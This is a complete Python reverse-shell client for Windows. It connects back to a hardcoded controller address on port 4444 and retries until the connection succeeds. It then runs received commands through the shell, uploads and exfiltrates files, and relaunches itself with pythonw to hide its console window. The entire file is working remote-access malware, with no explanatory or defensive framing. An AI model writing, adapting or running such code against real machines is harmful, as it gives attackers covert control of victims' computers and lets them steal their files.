import socket
import subprocess
import os
import sys

def main(host, port):
    # Create a socket object for IPv4 and TCP
    patil = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("connecting....")

    # Attempt to connect to the server
    while True:
        try:
            patil.connect((host, port))
            break
        except ConnectionRefusedError:
            pass
    print("connected")

    # Set the initial directory to C:/
    os.chdir('C:/')
    current_dir = os.getcwd()

    # Loop to receive and execute commands from the server
    while True:
        # Receive command from server
        receive = patil.recv(1024*1024*1024).decode()
        # Check for exit command to break the loop
        if receive == "exit":
            break
        # Handle cd command to change directory
        elif receive.startswith("cd "):
            try:
                new_dir = receive[3:].strip()
                os.chdir(new_dir)
                current_dir = os.getcwd()
                output = f"Changed directory to {current_dir}"
            except Exception as e:
                output = str(e)
            patil.send(output.encode())
        # Handle file upload command
        elif receive.startswith("upload "):
            filename = receive.split(" ", 1)[1]
            with open(filename, "wb") as f:
                while True:
                    # Receive file data from the server
                    file_data = patil.recv(1024*1024*1024)
                    # Check for DONE marker to end file writing
                    if file_data.endswith(b"DONE"):
                        f.write(file_data[:-4])
                        break
                    f.write(file_data)
            patil.send(b"Upload complete")
        # Handle file download command
        elif receive.startswith("download "):
            filename = receive.split(" ", 1)[1]
            try:
                # Open the file and read its contents
                with open(filename, "rb") as f:
                    file_data = f.read()
                # Send the file data to the server
                patil.sendall(file_data)
                # Send a DONE marker to indicate end of file
                patil.send(b"DONE")
            except FileNotFoundError:
                patil.send(b"ERROR")
        else:
            # Execute command and capture output
            try:
                output = subprocess.check_output(receive, shell=True, stderr=subprocess.STDOUT, cwd=current_dir).decode()
            except subprocess.CalledProcessError as e:
                output = e.output.decode()
            # Send the output back to the server
            patil.send(output.encode())

    # Close the connection
    patil.close()

if __name__ == "__main__":
    # Directly use predefined host and port
    host = "192.168.139.128"
    port = 4444

    # Check if script is running in the background
    if len(sys.argv) == 1:
        # Restart the script in the background
        subprocess.Popen(["pythonw", sys.argv[0], host, str(port)], close_fds=True)
    else:
        # Run the main function with provided host and port
        host = sys.argv[1]
        port = int(sys.argv[2])
        main(host, port)
